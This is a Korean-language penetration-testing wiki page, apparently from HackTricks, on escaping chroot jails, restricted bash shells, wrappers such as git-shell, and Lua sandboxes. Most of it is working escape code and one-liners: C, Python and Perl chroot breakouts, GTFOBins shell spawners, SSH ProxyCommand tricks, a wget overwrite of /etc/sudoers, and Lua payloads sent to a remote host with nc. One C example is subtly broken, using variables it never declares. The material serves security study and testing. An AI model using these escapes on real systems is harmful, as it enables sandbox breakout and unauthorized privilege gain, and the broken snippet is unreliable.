# Jail 탈출

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**[**https://gtfobins.github.io/**](https://gtfobins.github.io)에서 "Shell" property를 사용해 어떤 binary든 실행할 수 있는지 **검색하세요**

## Chroot 탈출

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)에 따르면: chroot 메커니즘은 **권한이 있는** (**root**) **사용자의 의도적인 변조를 방어하기 위한 것이 아닙니다**. 대부분의 시스템에서 chroot context는 제대로 중첩되지 않으며, **충분한 권한을 가진 chroot 프로그램은 두 번째 chroot를 수행해 탈출할 수 있습니다**.\
일반적으로 이는 탈출하려면 chroot 내부에서 root여야 한다는 의미입니다.<sup>[[4]](#references)</sup>

> [!TIP]
> **tool** [**chw00t**](https://github.com/earthquake/chw00t)는 다음 시나리오를 악용하고 `chroot`에서 탈출하기 위해 만들어졌습니다.<sup>[[1]](#references)[[5]](#references)</sup>

### Root + CWD

> [!WARNING]
> chroot 내부에서 **root**라면 **또 다른 chroot를 생성해 탈출할 수 있습니다**. Linux에서는 두 개의 chroot가 공존할 수 없기 때문입니다. 따라서 folder를 생성한 다음, **새로운 chroot를 생성**하고 그 새로운 folder에서 **새 chroot 외부에 있는 상태로** 실행하면, 이제 **새로운 chroot 외부에** 있게 되며 결과적으로 FS에 있게 됩니다.
>
> 이는 일반적으로 chroot가 working directory를 지정된 위치로 이동하지 않기 때문에 발생합니다. 따라서 chroot를 생성하더라도 그 외부에 있을 수 있습니다.<sup>[[4]](#references)[[5]](#references)</sup>

일반적으로 chroot jail 내부에서는 `chroot` binary를 찾을 수 없지만, binary를 **compile하고 upload한 다음 execute**할 수 있습니다:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + 저장된 fd

> [!WARNING]
> 이는 이전 사례와 유사하지만, 이 경우 **공격자는 현재 디렉터리에 대한 파일 디스크립터를 저장한 후** **새 폴더에 chroot를 생성**합니다. 마지막으로, chroot **외부에서** 해당 **FD**에 **액세스**할 수 있으므로, 이를 사용해 **탈출**합니다.<sup>[[4]](#references)[[5]](#references)</sup>

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD는 Unix Domain Sockets를 통해 전달할 수 있으므로:
>
> - 자식 프로세스를 생성합니다(fork).
> - 부모와 자식이 통신할 수 있도록 UDS를 생성합니다.
> - 자식 프로세스에서 다른 폴더를 대상으로 chroot를 실행합니다.
> - 부모 proc에서 새 자식 proc의 chroot 외부에 있는 폴더의 FD를 생성합니다.
> - UDS를 사용하여 해당 FD를 자식 proc에 전달합니다.
> - 자식 프로세스가 해당 FD로 chdir하면, 그 위치가 자신의 chroot 외부에 있으므로 jail에서 탈출할 수 있습니다.<sup>[[5]](#references)[[6]](#references)</sup>

### Root + Mount

> [!WARNING]
>
> - root device (/)를 chroot 내부의 디렉터리에 mount합니다.
> - 해당 디렉터리로 chroot합니다.
>
> Linux에서는 이것이 가능합니다.<sup>[[5]](#references)</sup>

### Root + /proc

> [!WARNING]
>
> - procfs를 chroot 내부의 디렉터리에 mount합니다(아직 mount되지 않은 경우).
> - 다른 root/cwd 항목을 가진 pid를 찾습니다. 예: /proc/1/root
> - 해당 항목으로 chroot합니다.<sup>[[4]](#references)[[5]](#references)[[7]](#references)</sup>

### Root(?) + Fork

> [!WARNING]
>
> - Fork(자식 proc)를 생성하고, FS에서 더 깊은 다른 폴더로 chroot한 다음 해당 폴더로 CD합니다.
> - 부모 프로세스에서 자식 프로세스가 있는 폴더를 자식의 chroot 이전 경로에 있는 폴더로 이동합니다.
> - 이 자식 프로세스는 자신이 chroot 외부에 있다는 것을 확인하게 됩니다.<sup>[[5]](#references)</sup>

### ptrace

> [!WARNING]
>
> - 프로세스가 `ptrace`로 attach할 수 있는지는 credentials, capabilities 및 Yama와 같이 활성화된 security modules에 따라 달라집니다. 따라서 same-user debugging도 system policy에 의해 제한될 수 있습니다.<sup>[[8]](#references)</sup>
> - attachment가 허용된다면, 프로세스에 ptrace하여 그 내부에서 shellcode를 실행할 수 있습니다([이 예제 참조](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).<sup>[[5]](#references)[[8]](#references)</sup>

## Bash Jails

### Enumeration

jail에 대한 정보를 가져옵니다:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH 수정

PATH 환경 변수를 수정할 수 있는지 확인합니다.<sup>[[2]](#references)</sup>
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Vim 사용하기

Vim을 사용할 수 있다면 `shell` 옵션을 실행할 수 있는 shell로 설정하고 `:shell`을 호출합니다.<sup>[[10]](#references)</sup>
```bash
:set shell=/bin/sh
:shell
```
### Pagers 및 help viewers

많은 제한된 환경에서는 여전히 **pagers** 또는 **help viewers**를 사용할 수 있습니다. 일반적으로 `PATH`를 다시 구성하려는 것보다 이러한 도구를 악용하는 편이 더 빠릅니다.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git`을 사용할 수 있는 경우, `--paginate` 옵션은 출력을 `less` 또는 `$PAGER`로 전송하므로 pager escape를 사용할 수 있을 때 유용합니다.<sup>[[9]](#references)</sup>
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### 일반적인 GTFOBins one-liners

접근 가능한 바이너리를 파악했다면, 먼저 명확한 shell spawner를 테스트하세요:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
허용된 command를 자유롭게 실행하는 대신 **arguments를 inject**할 수만 있다면, **GTFOArgs**도 확인하세요.<sup>[[17]](#references)</sup>

### 스크립트 생성

내용으로 _/bin/bash_를 사용하여 실행 가능한 파일을 생성할 수 있는지 확인하세요
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH에서 bash 가져오기

ssh를 통해 접속하는 경우, 제한된 login shell 대신 서버에 **다른 프로그램**을 실행하도록 요청할 수 있습니다.<sup>[[14]](#references)</sup>
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh`가 로컬에서 허용된 몇 안 되는 바이너리 중 하나라면, 이를 **GTFOBin**으로 악용할 수도 있다는 점을 기억하세요. `LocalCommand` 및 `ProxyCommand` 옵션은 로컬에 구성된 헬퍼 명령을 실행합니다.<sup>[[14]](#references)[[15]](#references)</sup>
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare

Bash에서 nameref는 할당을 다른 변수로 리디렉션하며, `BASH_CMDS`에 요소를 추가하면 해당 명령이 Bash의 내부 command hash table에 추가됩니다.<sup>[[11]](#references)[[12]](#references)</sup>
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Wget의 `-O` 옵션은 다운로드한 콘텐츠를 지정된 출력 파일에 기록합니다. 해당 경로에 쓰기 권한이 있으면 `/etc/sudoers`와 같은 파일을 덮어쓸 수 있습니다.<sup>[[13]](#references)</sup>
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

일부 환경에서는 일반 `rbash`로 진입하지 않고 **wrappers**인 `git-shell`, `rssh`, `lshell` 등으로 진입하게 됩니다:

- `git-shell`은 server-side Git commands와 `~/git-shell-commands/` 내부에 있는 항목만 허용합니다. 해당 디렉터리가 존재하면 `help`를 실행하여 허용된 custom actions를 열거하세요. 해당 위치에 **write**할 수 있다면, 그 디렉터리에 배치한 모든 executable에 접근할 수 있게 됩니다.<sup>[[3]](#references)</sup>
- `rssh` / `lshell`은 일반적으로 `scp`, `sftp`, `rsync` 또는 Git-style operations만 허용합니다. 이 경우 먼저 **file write primitives**에 집중하세요. `authorized_keys`, shell startup file 또는 helper script를 writable location에 업로드한 다음 `ssh -t ...`로 다시 연결합니다.
- wrapper가 command line만 필터링한다면 접근 가능한 binaries를 열거한 다음 **GTFOBins / GTFOArgs**로 다시 pivot하세요.

### Other tricks

다음도 확인하세요:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**다음 page도 흥미로울 수 있습니다:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

다음 page에서 python jails를 escape하는 tricks를 확인할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

이 page에서는 lua 내부에서 접근할 수 있는 global functions를 확인할 수 있습니다: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base).<sup>[[16]](#references)</sup>

표준 `load`, `string.char`, `os.execute` functions를 사용할 수 있다면 이를 통해 이 chunk를 build하고 실행할 수 있습니다.<sup>[[16]](#references)</sup>
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
`rawget`을 사용하면 점 표기법 대신 테이블 함수를 가져올 수도 있습니다.<sup>[[16]](#references)</sup>
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
`pairs`를 사용하여 라이브러리 테이블을 열거합니다.<sup>[[16]](#references)</sup>
```bash
for k,v in pairs(string) do print(k,v) end
```
`pairs`가 테이블 인덱스를 열거하는 순서는 지정되어 있지 않으므로 특정 함수가 먼저 나타난다고 가정하지 마세요. 특정 함수 하나를 실행해야 한다면, 서로 다른 lua 환경을 로드하고 library의 첫 번째 함수를 호출하는 방식으로 brute force attack을 수행할 수 있습니다.<sup>[[16]](#references)</sup>
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interactive lua shell 얻기**: 제한된 lua shell 내부에 있다면 `debug.debug()`를 호출하여 새로운 lua shell을 얻을 수 있습니다(그리고 제한이 없기를 기대할 수 있습니다). 이 호출은 interactive mode로 진입합니다.<sup>[[16]](#references)</sup>
```bash
debug.debug()
```
## References

- [1] [Chw00t: 다양한 Chroot 솔루션에서 탈출하는 방법 (Bucsay Balazs, DeepSec 발표 및 슬라이드)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git 문서](https://git-scm.com/docs/git-shell)
- [4] [chroot(2) – Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [5] [chw00t – chroot 탈출 도구](https://github.com/earthquake/chw00t)
- [6] [unix(7) – Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man7/unix.7.html)
- [7] [proc_pid_root(5) – Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [8] [ptrace(2) – Linux 매뉴얼 페이지](https://man7.org/linux/man-pages/man2/ptrace.2.html)
- [9] [git – Git 문서](https://git-scm.com/docs/git)
- [10] [:shell – Vim 문서](https://vimhelp.org/various.txt.html#%3Ashell)
- [11] [Bash Builtins – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Builtins.html)
- [12] [Bash Variables – GNU Bash Reference Manual](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [13] [GNU Wget 매뉴얼](https://www.gnu.org/software/wget/manual/wget.html)
- [14] [ssh(1) – OpenBSD 매뉴얼 페이지](https://man.openbsd.org/ssh)
- [15] [ssh_config(5) – OpenBSD 매뉴얼 페이지](https://man.openbsd.org/ssh_config)
- [16] [Lua 5.4 Reference Manual](https://www.lua.org/manual/5.4/manual.html)
- [17] [GTFOArgs: Argument Injection Exploitation Vector List](https://gtfoargs.github.io/)
{{#include ../../banners/hacktricks-training.md}}
